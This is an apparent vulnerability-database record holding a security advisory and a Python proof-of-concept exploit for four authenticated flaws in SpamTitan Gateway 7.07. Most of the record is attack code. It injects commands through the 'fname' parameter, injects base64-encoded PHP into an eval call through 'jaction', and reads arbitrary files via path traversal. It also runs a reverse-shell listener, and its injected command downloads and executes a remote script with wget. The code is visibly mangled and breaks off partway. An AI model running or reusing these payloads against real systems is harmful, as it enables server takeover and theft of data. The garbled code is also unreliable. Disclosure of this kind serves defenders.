{
    "text": "vul_name : SpamTitan 7.07 Remote Code Execution ， vul_cve : CVE-2020-11804 , CVE-2020-11803 , CVE-2020-11699 , CVE-2020-11700 ， vul_poc :  # Exploit Title : SpamTitan 7.07 - Remote Code Execution ( Authenticated )  ，  # Date : 2020-09-18 ，  # Exploit Author : Felipe Molina (  @ felmoltor )  ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : 7.07 ，  # Tested on : FreeBSD ，  # CVE : CVE-2020-11699 , CVE-2020-11700 , CVE-2020-11803 , CVE-2020-11804 ， - [ SPUK-2020-09/SpamTitan 7.07 Multiple Authenticated Remote Code ， Execution ] - ， SECURITY ADVISORY : SPUK-2020-09/SpamTitan 7.07 Multiple ， Authenticated Remote Code Execution ， Affected Software : SpamTitan Gateway 7.07 ( possibly earlier versions )  ， Vulnerability : Multiple Authenticated Remote Code Execution ， CVSSv3 : 8.7 ， Severity : High ， Release Date : 2020-09-18 ， CVEs : CVE-2020-11699 , CVE-2020-11700 , CVE-2020-11803 ,  ， CVE-2020-11804 ， I. Background ， From www.spamtitan.com :  ， \"SpamTitan Gateway is a powerful Anti-Spam appliance that equips network ， administrators with extensive tools to control mail flow and protect against ， unwanted email and malware.\" ， II. Description ， Multiple authenticated remote code execution ( RCE ) vulnerabilities were found ， on the SpamTitan Gateway 7.07 and probably in pervious versions :  ，  * CVE-2020-11699 : Improper validation of the parameter fname on the page ， certs-x.php would allow an attacker to execute remote code on the ， target server. The user has to be authenticated before interacting with ， this page. ，  * CVE-2020-11700 : Improper sanitization of the parameter fname , used on the page ， certs-x.php , would allow an attacker to retrieve the contents of ， arbitrary files. The user has to be ， authenticated before interacting with this page. ，  * CVE-2020-11803 : Improper sanitization of the parameter jaction when ， interacting with ， the page mailqueue.php could lead to PHP code evaluation server-side ,  ， because the user-provided input is passed directly to the php eval (  )  ， function. The user has to be authenticated on the web platform before ， interacting with the page. ，  * CVE-2020-11804 : Due to improper sanitization of the parameter qid ,  ， used in the page ， mailqueue.php , code injection can occur. The input for this ， parameter is provided directly by an authenticated user via an HTTP GET ， request. ， III. PoC ， Use python 3 and install the following modules before executing : requests. ， If your IP is 192.168.1.5 and the target SpamTitan server is ， spamtitan.example.com , call the PoC like this :  ， ./multirce.py -t spamtitan.example.com -i 192.168.1.5 -m <EXPLOIT ， NUMBER> -u <USER> -p <PASSWORD> -U ，  #  ! /usr/bin/env python ，  # Author : Felipe Molina (  @ felmoltor )  ，  # Date : 09/04/2020 ，  # Python Version : 3.7 ，  # Summary : This is PoC for multiple authenticated RCE and Arbitrary File Read ，  # 0days on SpamTitan 7.07 and previous versions. ，  # Product URL :  ，  # Product Version : 7.07 and probably previous ， from requests import Timeout ， requests.packages.urllib3.disable_warnings (  )  ， from optparse import OptionParser ， from urllib.parse import urlparse ， from time import sleep ， from base64 import b64decode , b64encode ， s = socket.socket ( socket.AF_INET , socket.SOCK_DGRAM )  ，  # doesn't even have to be reachable ， s.connect ( '10.255.255.255' , 1 )  ， IP = s.getsockname (  )  [ 0 ]  ， IP = '127.0.0.1' ， finally :  ， s.close (  )  ， servers = socket.socket ( socket.AF_INET , socket.SOCK_STREAM )  ， servers.bind ( ip , port )  ， servers.listen ( 1 )  ， info ( \"Waiting for incoming connection on %s : %s\" % ( ip , port )  ， conn , addr = servers.accept (  )  ， conn.settimeout ( 1 )  ， success ( \"Hurray , we got a connection from %s\" % addr [ 0 ]  )  ， prompt =conn.recv ( 128 )  ， prompt=str ( prompt.decode ( \"utf-8\" ) .strip (  )  ， command = input ( prompt )  ， c = \"%s\\n\" % ( command )  ， conn.sendall ( c.encode ( \"utf-8\" )  ，  # Quit the console ， info ( \"\\nClosing connection\" )  ， conn.close (  )  ， completeanswer=\" ， answer=None ， answer=str ( conn.recv ( 1024 ) .decode ( \"utf-8\" )  ， completeanswer+=answer ， completeanswer.strip (  )  ， print ( completeanswer , end=' )  ， command = input ( \" )  ， info ( \"\\nClosing connection\" )  ，  # This is an authenticated remote code execution in \"certs-x.php\". E.g :  ，  # Giving time to the maim thread to open the reverse shell listener ， sleep ( 5 )  ， oscmd=\"/usr/local/bin/wget %s -O /tmp/r.py ; /usr/local/bin/python ， /tmp/r.py\" % ( shellurl )  ， t1 = \"%s/certs.php\" % target ， t2 = \"%s/certs-x.php\" % target ，  # get the csrf token value ， res1 = requests.get ( t1 , cookies=cookies , verify=False )  ， m = re.search ( \"var csrf_token_postdata ， =. * CSRFName= ( . *  ) &CSRFToken= ( . *  ) \\\" ; \" , res1.text )  ， csrfguard=m.group ( 1 )  ， csrftoken=m.group ( 2 )  ， data = { ， \"CSRFName\" : csrfguard ,  ， \"CSRFToken\" : csrftoken ,  ， \"jaction\" : \"deletecert\" ,  ， \"fname\" : \"dummy |  $  ( %s ) \" % oscmd ， } ， info ( \"Triggering the reverse shell in the target.\" )  ， res2 = requests.post ( t2 , data=data , cookies=cookies , verify=False )  ， print ( res2.text )  ， info ( \"Request timed-out. You should have received already ， your reverse shell.\" )  ， fail ( \"CSRF tokens were not found. POST will fail.\" )  ，  # This is an arbitrary file read on \"certs-x.php\" ， fullpath=\"./././.%s\" % file ， t1 = \"%s/certs.php\" % target ， t2 = \"%s/certs-x.php\" % target ，  # get the csrf token value ， res1 = requests.get ( t1 , cookies=cookies , verify=False )  ， m = re.search ( \"var csrf_token_postdata ， =. * CSRFName= ( . *  ) &CSRFToken= ( . *  ) \\\" ; \" , res1.text )  ， csrfguard=m.group ( 1 )  ， csrftoken=m.group ( 2 )  ， data = { ， \"CSRFName\" : csrfguard ,  ， \"CSRFToken\" : csrftoken ,  ， \"jaction\" : \"downloadkey\" ,  ， \"fname\" : fullpath ,  ， \"commonname\" : \" ,  ， \"organization\" : \" ,  ， \"organizationunit\" : \" ,  ， \"city\" : \" ,  ， \"state\" : \" ,  ， \"country\" : \" ,  ， \"csrout\" : \" ,  ， \"pkout\" : \" ,  ， \"importcert\" : \" ,  ， \"importkey\" : \" ,  ， \"importchain\" : \" ， } ， res2 = requests.post ( t2 , data=data , cookies=cookies , verify=False )  ， success ( \"Contents of the file %s\" % file )  ， print ( res2.text )  ， fail ( \"Error obtaining the CSRF guard tokens from the page.\" )  ，  # This is an authenticated RCE abusing PHP eval function in mailqueue.php ，  # Giving time to the maim thread to open the reverse shell listener ， sleep ( 5 )  ， oscmd=\"/usr/local/bin/wget %s -O /tmp/r.py ; /usr/local/bin/python ， /tmp/r.py\" % ( shellurl )  ， b64= ( b64encode ( oscmd.encode ( \"utf-8\" ) .decode ( \"utf-8\" )  ， payload=\"gotopage+a+\\\" ;  $ b=\\\"%s\\\" ; shell_exec ( base64_decode ( urldecode (  $ b )  ; die (  )  ;  $ b=\\\" ， % ( b64 )  ， t1 = \"%s/certs.php\" % target ， t2 = \"%s/mailqueue.php\" % target ，  # get the csrf token value ， res1 = requests.get ( t1 , cookies=cookies , verify=False )  ， m = re.search ( \"var csrf_token_postdata ， =. * CSRFName= ( . *  ) &CSRFToken= ( . *  ) \\\" ; \" , res1.text )  ， csrfguard=m.group ( 1 )  ， csrftoken=m.group ( 2 )  ， data = { ， \"CSRFName\" : csrfguard ,  ， \"CSRFToken\" : csrftoken ,  ， \"jaction\" : payload ,  ， \"activepage\" : \"incoming\" ,  ， \"incoming_count\" : \"0\" ,  ， \"active_count\" : \"0\" ,  ， \"deferred_count\" : \"0\" ,  ， \"hold_count\" : \"0\" ,  ， \"corrupt_count\" : \"0\" ,  ， \"incoming_page\" : \"1\" ,  ， \"active_page\" : \"1\" ,  ， \"deferred_page\" : \"1\" ,  ， \"hold_page\" : \"1\" ,  ， \"corrupt_page\" : \"1\" ,  ， \"incomingrfilter\" : None ,  ， \"incomingfilter\" : None ,  ， \"incoming_option\" : \"hold\" ,  ， \"activerfilter\" : None ,  ， \"activefilter\" : None ,  ， \"active_option\" : \"hold\" ,  ， \"deferredrfilter\" : None ,  ， \"deferredfilter\" : None ,  ， \"deferred_option\" : \"hold\" ,  ， \"holdrfilter\" : None ,  ， \"holdfilter\" : None ,  ， \"hold_option\" : \"release\" ,  ， \"corruptrfilter\" : None ,  ， \"corruptfilter\" : None ,  ， \"corrupt_option\" : \"delete\" ， } ，  # We have to pass a string instead of a dict if we don't want ， the requests library to convert it to ，  # an urlencoded data and break our payload ， datastr=\" ， cont=0 ， datastr+=\"%s=%s\" % ( k , v )  ， cont+=1 ， datastr+=\"&\" ， headers={ ， \"User-Agent\" : \"Mozilla/5.0 ( Windows NT 10.0 ; rv : 68.0 )  ， Gecko/20100101 Firefox/68.0\" ,  ， \"Accept\" : ",
    "time": "2020.09.19"
}